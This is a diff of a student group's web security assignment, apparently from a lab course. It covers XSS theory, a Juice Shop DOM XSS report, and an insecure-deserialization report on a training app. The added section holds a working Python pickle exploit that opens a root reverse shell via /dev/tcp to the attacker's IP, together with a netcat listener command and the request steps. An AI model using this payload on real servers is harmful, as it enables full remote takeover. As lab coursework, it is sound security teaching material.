@@ -15,7 +15,7 @@ Group ID: TTV19S1
      - The malicious script can speard to other user. According to the Myspace example in the book, the malicious script can copy the to user's profile and when another user visite the victim profile, they will also infected by that malicious script.
    - What are the two main types of XSS and how do they differ from each other? (1 point)
      - The two main types of XSS are reflected XSS and stored XSS. The difference is that reflected XSS occur when victim open the link that contains the malicious script on the user's web browser (happend on user's web browser). In contrast, stored XSS is an injection that attacker inject malicious scripts on the server (happend on server) such as some field in the database.
-   
+
 2. [Issue report] **Target => Juice Shop**: DOM XSS (2 pts)
 
    **Title:** Attcker enable to perform DOM XSS to search input.
@@ -118,7 +118,7 @@ Group ID: TTV19S1
 
      The **vulnerabilities** that might be enable is when attacker manipulate the serialized object such as replace a serialized object with an object of different class. That means attacker can pass harmful data into application.
 
-     The **different** of serialization between programming language is the type of serialization file. For example, java will convert to .ser and python might convert to .picl (in case we use pickle library)
+     The **different** of serialization between programming language is the algorithm of how it convert the state of object into byte stream. For example, pickle in python use stack-based virtual pickle machine, in contrast java use FileOutputStream class.
 
 2. [Issue report] WasDat Insecure Deserialization (7 pts)
 
@@ -180,12 +180,44 @@ Group ID: TTV19S1
      After backend deserialized, file `boyplus.txt` will be created in `/bin/bash`  as shown below
 
      ![Screen Shot 2565-02-10 at 00.00.57](/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week4/Screenshot/Screen Shot 2565-02-10 at 00.00.57.png)
+  
+   - Run simple netcat server on port `8888` by running (on our machine)
 
+     ```shell
+  nc -nvlp 8888
+     ```
+
+   - In order to reverse shell, edit `main.py` to the following code 
    
-
-   **Impact Estimation:** High serverity because attacker can reverse shell of backend and control the entire server.
-
+     ```python
+     import os
+     import pickle
+     import base64
+     
+     class RCE:
+         def __reduce__(self):
+         	cmd = ('su - -c "sh -i > /dev/tcp/192.168.1.43/8888 0>&1"')
+         	return os.system, (cmd,)
+     
+     if __name__ == '__main__':
+         pickled = pickle.dumps(RCE())
+         print(base64.urlsafe_b64encode(pickled).decode())
+     
+     ```
+   
+     The cmd in code will switching user to root and create the reverse shell to my IP address.
+   
+   - Run `python3 main.py >> reverse_shell.pickle` and use this file as the payload for making request POST `/api/import`
+   
+     <img src="/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week4/Screenshot/Screen Shot 2565-02-10 at 06.55.04.png" alt="Screen Shot 2565-02-10 at 06.55.04" style="zoom:50%;" />
+   
+     After making the request, we can connect to shell of wasdat backend as shown below (user is root)
+   
+     <img src="/Users/boyplus/Desktop/CS/JAMK/Web-App-Security/Week4/Screenshot/Screen Shot 2565-02-10 at 06.56.35.png" alt="Screen Shot 2565-02-10 at 06.56.35" style="zoom:50%;" />
+   
+   **Impact Estimation:** High serverity because attacker can reverse shell of backend and control the entire server. They can do anything they want such as delete all file.
+   
    **Mitigation:**
-
+   
    - User JSON serialization/deserialization library instead of `pickle` library which has the vulnerability in deserialization.
 
